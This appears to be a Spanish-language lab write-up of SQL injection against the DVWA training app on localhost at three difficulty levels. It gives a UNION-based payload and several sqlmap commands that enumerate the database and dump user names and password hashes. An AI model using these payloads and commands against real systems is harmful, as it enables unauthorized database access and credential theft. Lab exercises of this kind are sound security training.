# SQLi

Se ha utilizado la herramienta SQLmap para realizar el ataque de inyección SQL y Burp Suite para interceptar
el tráfico entre el cliente y el servidor.

## Bajo
En este nivel, la vulnerabilidad se encuentra claramente en la siguiente línea, que
permite introducir entradas maliciosas manipulando la cadena de consulta SQL:

```php
// Check database
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"
```

En este nivel se intentó inicialmente introducir entradas maliciosas manualmente.
La siguiente entrada permite obtener la contraseña (aún encriptada):
```
' UNION SELECT first_name,password FROM users;-- -&Submit=Submit
```

El objetivo de la cadena maliciosa es doble:

- En primer lugar, se escapa la consulta inicial y se fusiona con otra consulta que permite obtener la contraseña de todos los usuarios. Cabe destacar que sólo es posible incluir 2 columnas, ya que en caso contrario la petición HTTP falla.
- En segundo lugar, se debe escapar la consulta SQL, comentando el resto de la cadena, para así poder realizar la petición.

También se utilizó la herramienta SQLMap para obtener las contraseñas de manera automática y también para descifrarlas, ya que se observa que están encriptadas mediante MD5. A continuación se describe la metodología empleada:

- Se ha capturado la cookie de sesión al hacer una petición a través de la página web. En este apartado se llevó a cabo inspeccionando el tráfico con el navegador, pero es posible utilizar herramientas como Burpsuite o Live HTTP headers para interceptar y manipular el tráfico.
- Después, se ha construido el comando que lanza SQLMap e inicia las pruebas de inyección SQL:
    - SQLMap requiere algún parámetro **inyectable** (por ejemplo, en una query, un formulario o una cookie, entre otros) para poder realizar las pruebas de inyección SQL.

    - Se incluye también la cookie interceptada para realizar la petición con una sesión activa.

- Seguidamente, se inspecciona de manera gradual la estructura de la base de datos, comenzando por obtener los nombres de los esquemas, y profundizando en ellos hasta llegar al nivel de las propias tablas:

    - A nivel de **esquemas**:
        ```bash
        sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch --dbs
        ```
        ![dbs](assets/sqli_dbs.png)
    - A **nivel relacional** en el esquema `dvwa`:
        ```bash
        sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch -D dvwa --tables
        ```
        ![tabs](assets/sqli_tabs.png)
    - A nivel de **tabla** en la entidad `users`:
        ```bash
        sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch -D dvwa -T users --columns
        ```
        ![cols](assets/sqli_cols.png)


- Finalmente, se obtiene el contenido de la tabla de usuarios con el siguiente comando, que vuelca las columnas seleccionadas (y se se desea se pueden desencriptar):

![dump](assets/sqli_dump.png)

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low" --batch -D dvwa -T users -C user,password --dump
```

## Medio
Ahora la petición se realiza mediante un formulario, por lo que SQLmap es una herramienta ideal en este apartado. 
Aún así, se podría hacer de manera manual con la misma consulta ligeramente transformada (hace uso de la función `mysql_real_escape_string()`, por lo que hay que reestructurarla manualmente), enviada a través del formulario por POST.

Se ha escogido la primera opción por simplicidad, ya que el comando necesario para realizar la inyección es muy similar. Sólo hay que añadir la petición mediante formulario por POST:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/#" --cookie "PHPSESSID=nvptnh9pkg3tjbnt391ut2vodi; security=low"  --data "id=1&Submit=Submit" --batch --dbs
```

![med](assets/sqli_med.png)

Se puede evitar la fase de inspección de la base de datos, aunque si fuera necesario el procedimiento es análogo.

## Alto

En este nivel el identificador se introduce en la propia cookie. Además, el formulario se envía desde otra página distinta, por lo que es necesario incluir una url secundaria que sirve como punto de recepción de los resultados del ataque. La url secundaria será . Por lo demás, el comando es muy similar. 

En este apartado se ha usado además BurpSuite para interceptar el tráfico al lanzar una petición desde el formulario de la ventana emergente y así obtener la cookie necesaria. El procedimiento es análogo a los anteriores con el nuevo comando:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/session-input.php" --cookie "PHPSESSID=<session>; security=high" --data="id=1&Submit&Submit" --second-url "http://localhost/DVWA/vulnerabilities/sqli" --batch -D dvwa -T users -C user,password --dump
```

- El efecto de añadir la url secundaria es capturar la redirección para obtener los resultados de la inyección.
![redir](assets/sqli_redir_hi.png)

- El resultado es de nuevo la lista de usuarios con sus contraseñas:
![hi](assets/sqli_hi.png)